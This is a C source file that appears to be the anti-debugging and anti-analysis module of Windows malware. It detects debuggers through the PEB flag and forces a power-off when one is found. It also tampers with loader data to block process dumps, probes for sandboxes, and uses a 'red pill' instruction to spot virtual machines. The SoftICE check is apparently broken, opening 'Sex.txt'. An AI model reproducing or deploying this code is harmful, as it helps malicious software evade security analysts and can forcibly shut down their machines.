#include "includes.h"
#include "fileincludes.h"
#include "externs.h"


#ifndef NO_ANTIDEBUG
DWORD WINAPI antidebug_detectdebugger(LPVOID param)
{
	bool bPresent = FALSE;
	while (TRUE)
	{
		_asm
		{
				push eax
				mov eax, FS:[18h]
				mov eax, [eax + 30h]
				movzx eax, BYTE PTR[eax + 2]
				test eax, eax
				jnz DebuggerPresent

				jmp End

				DebuggerPresent:
				mov bPresent, TRUE

				End:
				pop eax
		}
		if (bPresent)
				antidebug_payload();
			Sleep(10);
	}
//		thread_remove(THREAD_ANTIDEBUG);
		return 0;
}



void antidebug_payload()
{

		ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
		ExitProcess(0);
		return;
}


void antidebug_procdump()
{


	__asm
	{
			mov eax, fs:[0x30]
			mov eax, [eax + 0xC]
			mov eax, [eax + 0xC]
			add dword ptr [eax + 0x20], 0x2000
	}
		return;
}

void antidebug_sandbox()
{
	DWORD dwAddress, dwTime1, dwTime2, dwTime3;
	HMODULE hModule;
	unsigned char szBytes[] =
	{
			0xc8,
			0x0,
			0x4,
			0x0,
			0x60
	};

	if (MessageBoxA((HWND)0xFFFFFFFF, NULL, NULL, MB_OK))
			ExitProcess(0);
		dwTime1 = GetTickCount();
		Sleep(10);
		dwTime2 = GetTickCount();
		Sleep(10);
		dwTime3 = GetTickCount();
	if (((dwTime2 - dwTime1) < 10) && ((dwTime3 - dwTime1) < 20))
			ExitProcess(0);
	if (*PDWORD(0x7C800140) == 0x0)
			ExitProcess(0);
		hModule = GetModuleHandle("user32.dll");
		dwAddress = (DWORD)GetProcAddress(hModule, "MessageBoxA");
	if (memcmp((LPVOID)dwAddress, (LPVOID)szBytes, sizeof(szBytes)) == 0)
			ExitProcess(0);
		return;
}

bool antidebug_softice()
{
	HANDLE hFile;

		hFile = CreateFile("Sex.txt",
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			return TRUE;
	}
		CloseHandle(hFile);
		return FALSE;
}

bool antidebug_vm2()
{
	unsigned char m[2+4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
	*((unsigned*)&rpill[3]) = (unsigned)m;
	((void(*)())&rpill)();
	return (m[5]>0xd0) ? 1 : 0;
}
bool antidebug_vm() // FIXME gives false positives sometimes
{
	unsigned char rpill[] =
			"\x0F\x01\x0D\x00\x00\x00\x00\xC3";
	unsigned char m[2 + 4];


		*((unsigned *)&rpill[3]) = (unsigned)m;
	__asm 
	{
			lea eax, rpill
			call eax
	}
	if (m[5] > 0xD0)
			return TRUE;
		return FALSE;
}
#endif